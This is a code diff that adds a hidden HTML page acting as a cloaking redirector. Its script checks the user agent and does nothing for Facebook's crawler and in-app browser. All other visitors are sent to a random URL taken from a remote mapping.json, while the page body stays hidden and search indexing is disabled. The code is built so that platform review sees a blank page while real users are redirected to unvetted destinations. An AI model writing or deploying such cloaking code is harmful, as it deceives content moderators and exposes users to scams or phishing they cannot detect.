@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{display:none;margin:0;}
+</style>
+<script>
+(async () => {
+
+  const ua = navigator.userAgent || "";
+
+  // detect FB — no jump
+  if (
+    ua.includes("FBAN") || 
+    ua.includes("FBAV") || 
+    ua.includes("FB_IAB") || 
+    ua.includes("Facebot") || 
+    ua.includes("facebookexternalhit")
+  ) return;
+
+  try {
+    const res = await fetch("/mapping.json?ts=" + Date.now(), { cache:"no-store" });
+    const data = await res.json();
+    const links = data.links.filter(x => x.active);
+    if(!links.length) return;
+
+    const url = links[Math.floor(Math.random()*links.length)].url;
+
+    if (/iPhone|iPad|iPod/i.test(ua)) {
+      location.href = url;
+      return;
+    }
+
+    // android
+    location.href = url;
+
+  } catch(e){}
+})();
+</script>
+</head>
+<body></body>
+</html>
